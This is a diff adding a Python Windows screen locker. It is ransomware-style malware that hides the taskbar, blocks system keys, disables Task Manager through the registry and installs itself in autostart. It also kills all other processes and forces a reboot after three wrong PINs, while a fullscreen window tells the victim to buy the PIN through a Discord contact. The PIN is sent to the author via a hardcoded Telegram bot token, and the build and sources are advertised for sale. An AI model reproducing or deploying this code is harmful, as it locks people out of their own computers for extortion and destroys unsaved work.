@@ -1,0 +1,325 @@
+import os
+import random
+import time
+import tkinter as tk
+from tkinter import messagebox
+import telebot
+import keyboard
+import winreg  # Для работы с реестром Windows
+import ctypes  # Для работы с Windows API для скрытия панели задач
+import psutil  # Для работы с процессами
+from threading import Thread
+
+
+# Переменные
+pin_code = ""
+pin_input = ""
+attempts = 0
+max_attempts = 3
+admin_telegram_id = 5221256818  # Телеграм ID для отправки пин-кода
+bot_token = "7302717410:AAH9jS4nlGzFurLr-px-wgvkxI8Pu9Tth54"
+login_success = False
+running = True
+
+# Windows API для скрытия/восстановления панели задач
+HWND = ctypes.windll.user32.FindWindowW
+SW_HIDE = 0
+SW_SHOW = 5
+
+def hide_taskbar():
+    """Скрыть панель задач"""
+    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW(None, "Shell_TrayWnd"), SW_HIDE)
+
+def show_taskbar():
+    """Показать панель задач"""
+    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW(None, "Shell_TrayWnd"), SW_SHOW)
+
+
+# Функция для отправки пин-кода в Telegram с использованием библиотеки telebot
+def send_pin_to_telegram(pin):
+    try:
+        bot = telebot.TeleBot(bot_token)
+        bot.send_message(admin_telegram_id, f"Компьютер был запущен!\nТочно ли вы его запустили?\nВведите на ПК этот PIN: {pin}")
+        print(f"Пин-код {pin} успешно отправлен пользователю {admin_telegram_id}.")
+    except Exception as e:
+        print(f"Ошибка отправки пин-кода в Telegram: {e}")
+
+
+# Функция для генерации пин-кода и отправки его в Telegram
+def generate_and_send_pin():
+    global pin_code
+    pin_code = str(random.randint(100000, 999999))  # Генерация пин-кода
+    print(f"Сгенерирован пин-код: {pin_code}")  # Логирование сгенерированного пин-кода
+    send_pin_to_telegram(pin_code)
+
+
+# Блокировка клавиш
+def block_keys():
+    while running:
+        keyboard.block_key('ctrl')
+        keyboard.block_key('alt')
+        keyboard.block_key('win')
+        keyboard.block_key('esc')
+        keyboard.block_key('shift')
+        keyboard.block_key('f4')
+        keyboard.block_key('del')
+        # Блокировка сочетаний клавиш Ctrl+Alt+Del и других системных команд
+        keyboard.block_key('ctrl+alt+del')  # Ctrl+Alt+Del
+        keyboard.block_key('alt+tab')  # Alt+Tab
+        keyboard.block_key('alt+f4')  # Alt+F4
+        keyboard.block_key('ctrl+esc')  # Ctrl+Esc (Menu Start)
+        time.sleep(0.1)
+
+
+# Функция для добавления цифры в пин-код
+def add_digit(digit):
+    global pin_input
+    pin_input += str(digit)
+    pin_entry.delete(0, tk.END)
+    pin_entry.insert(0, "*" * len(pin_input))  # Показываем звездочки для конфиденциальности
+    if len(pin_input) == 6:
+        check_pin()
+
+
+# Проверка пин-кода
+def check_pin():
+    global attempts, pin_input, pin_code
+    if pin_input == pin_code:
+        login_successful()
+    else:
+        attempts += 1
+        if attempts >= max_attempts:
+            messagebox.showerror("Ошибка", "Превышено количество попыток. Перезагрузка.")
+            os.system("shutdown /r /f /t 0")  # Перезагрузка ПК
+        else:
+            pin_input = ""
+            pin_entry.config(state=tk.NORMAL)
+            pin_entry.delete(0, tk.END)
+            messagebox.showwarning("Ошибка", f"Неверный пин-код. Попытка {attempts}/{max_attempts}.")
+
+
+# Функция при успешной авторизации
+def login_successful():
+    global login_success, running
+    login_success = True
+    messagebox.showinfo("РЕЕСТР ПРОВЕРЬ", "Теряйся немощ")
+    running = False  # Разблокировать клавиши
+    root.quit()  # Закрыть окно
+
+    # Включить работу клавиш
+    keyboard.unblock_key('ctrl')
+    keyboard.unblock_key('alt')
+    keyboard.unblock_key('win')
+    keyboard.unblock_key('esc')
+    keyboard.unblock_key('shift')
+    keyboard.unblock_key('f4')
+
+    # Восстановить настройку реестра для Ctrl+Alt+Del
+    enable_ctrl_alt_del()
+
+    # Восстановить панель задач
+    show_taskbar()
+
+
+# Окно программы для ввода пин-кода
+def setup_gui_for_pin():
+    global pin_input, pin_entry, pin_label
+    global root
+    root = tk.Tk()
+    root.title("WINLOCK:ADsBUTTER")
+    root.geometry("1920x1080")  # Окно на весь экран
+    root.attributes("-fullscreen", True)  # Сделать окно полноэкранным
+    root.config(bg="red")
+
+    # Запрещаем закрывать окно
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    # Текущий ввод пин-кода
+    pin_input = ""
+    pin_label = tk.Label(root, text="WINDOWS BLOCK :) \n Купить PIN - Discord:adsbutter \n Введите пин-код", font=("Helvetica", 32), bg="red", fg="black")
+    pin_label.pack(pady=100)
+
+    # Поле для отображения пин-кода
+    pin_entry = tk.Entry(root, font=("Helvetica", 48), show="*", width=10)
+    pin_entry.pack(pady=50)
+
+    # Кнопки для ввода пин-кода
+    button_frame = tk.Frame(root, bg="red")
+    button_frame.pack(pady=50)
+    for i in range(10):
+        btn = tk.Button(button_frame, text=str(i), font=("Helvetica", 24), width=5, height=2, command=lambda i=i: add_digit(i))
+        btn.grid(row=i//3, column=i%3)
+
+    # Кнопка стирания
+    erase_btn = tk.Button(root, text="Очистить", font=("Helvetica", 24), command=erase_input)
+    erase_btn.pack(pady=20)
+
+    pin_label = tk.Label(root, text="Купить билд + исходники \n DS: adsbutter", font=("Helvetica", 8), bg="red", fg="black")
+    pin_label.pack(pady=10)
+    
+
+    # Запуск блокировки клавиш
+    block_keys_thread = Thread(target=block_keys)
+    block_keys_thread.daemon = True
+    block_keys_thread.start()
+
+
+    # Скрыть панель задач
+    hide_taskbar()
+
+    root.mainloop()
+
+
+
+# Очистка введенного пин-кода
+def erase_input():
+    global pin_input
+    pin_input = ""
+    pin_entry.delete(0, tk.END)
+    pin_entry.config(state=tk.NORMAL)
+
+
+# Функция для добавления программы в автозагрузку
+def add_to_autostart():
+    try:
+        # Путь к исполняемому файлу
+        path = os.path.realpath(__file__)
+
+        # Ключ реестра для автозагрузки
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        reg_key = "MyApp"  # Имя ключа автозагрузки (можно изменить)
+
+        # Открытие реестра и добавление записи
+        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, reg_key, 0, winreg.REG_SZ, path)
+        winreg.CloseKey(key)
+        print("Программа добавлена в автозагрузку.")
+    except Exception as e:
+        print(f"Ошибка при добавлении в автозагрузку: {e}")
+
+
+# Функция для проверки, есть ли программа в автозагрузке
+def check_autostart():
+    try:
+        # Путь к реестру для автозагрузки
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        reg_key = "MyApp"  # Имя ключа автозагрузки (можно изменить)
+
+        # Подключение к реестру
+        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_READ)
+
+        try:
+            value, _ = winreg.QueryValueEx(key, reg_key)
+            print(f"Программа найдена в автозагрузке: {value}")
+        except FileNotFoundError:
+            print("Программы нет в автозагрузке.")
+            add_to_autostart()  # Если программы нет в автозагрузке, добавляем
+        winreg.CloseKey(key)
+    except Exception as e:
+        print(f"Ошибка при проверке автозагрузки: {e}")
+
+
+# Функция для отключения Ctrl+Alt+Del
+def disable_ctrl_alt_del():
+    try:
+        # Путь к реестру для отключения Task Manager (Ctrl+Alt+Del)
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        reg_key = "DisableTaskMgr"  # Отключение Task Manager
+
+        # Подключение к реестру
+        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
+
+        # Установка значения 1 для отключения
+        winreg.SetValueEx(key, reg_key, 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        print("Ctrl+Alt+Del отключено через реестр.")
+    except Exception as e:
+        print(f"Ошибка при отключении Ctrl+Alt+Del: {e}")
+
+
+# Функция для включения Ctrl+Alt+Del
+def enable_ctrl_alt_del():
+    try:
+        # Путь к реестру для включения Task Manager (Ctrl+Alt+Del)
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        reg_key = "DisableTaskMgr"  # Отключение Task Manager
+
+        # Подключение к реестру
+        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
+
+        # Установка значения 0 для включения
+        winreg.SetValueEx(key, reg_key, 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+        print("Ctrl+Alt+Del включено через реестр.")
+    except Exception as e:
+        print(f"Ошибка при включении Ctrl+Alt+Del: {e}")
+
+
+# Основная логика программы
+def main():
+    # Отслеживание и закрытие нежелательных процессов в фоновом режиме
+    monitor_processes_thread = Thread(target=monitor_processes)
+    monitor_processes_thread.daemon = True
+    monitor_processes_thread.start()
+
+    disable_ctrl_alt_del()  # Отключаем Ctrl+Alt+Del
+    check_autostart()  # Проверяем автозагрузку
+    generate_and_send_pin()  # Генерация и отправка пин-кода в Telegram
+    setup_gui_for_pin()  # Окно для ввода пин-кода
+
+
+def monitor_processes():
+    while running:
+        for proc in psutil.process_iter(attrs=["pid", "name"]):
+            try:
+                if proc.info["name"].lower() in ["taskmgr.exe", "processhacker.exe"]:
+                    print(f"Процесс {proc.info['name']} обнаружен, завершение...")
+                    proc.terminate()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+        time.sleep(1)
+
+# Список процессов, которые нужно игнорировать
+ALLOWED_PROCESSES = ["python.exe", "py.exe", "auth.exe"]  # Добавьте сюда имя вашего исполняемого файла, убирите лишние.
+
+# Закрытие всех процессов, кроме разрешённых
+def close_other_processes():
+    while True:
+        for proc in psutil.process_iter(attrs=["pid", "name"]):
+            try:
+                if proc.info["name"].lower() not in [p.lower() for p in ALLOWED_PROCESSES]:
+                    print(f"Закрытие процесса: {proc.info['name']}")
+                    proc.terminate()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+        time.sleep(1)
+
+# Блокировка запуска новых процессов
+def prevent_new_processes():
+    existing_pids = {proc.pid for proc in psutil.process_iter()}
+    while True:
+        current_pids = {proc.pid for proc in psutil.process_iter()}
+        new_pids = current_pids - existing_pids
+
+        for pid in new_pids:
+            try:
+                proc = psutil.Process(pid)
+                if proc.name().lower() not in [p.lower() for p in ALLOWED_PROCESSES]:
+                    print(f"Закрытие нового процесса: {proc.name()}")
+                    proc.terminate()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+
+        existing_pids = current_pids
+        time.sleep(1)
+
+if __name__ == "__main__":
+    # Запуск потоков для мониторинга
+    Thread(target=close_other_processes, daemon=True).start()
+    Thread(target=prevent_new_processes, daemon=True).start()
+    main()
+
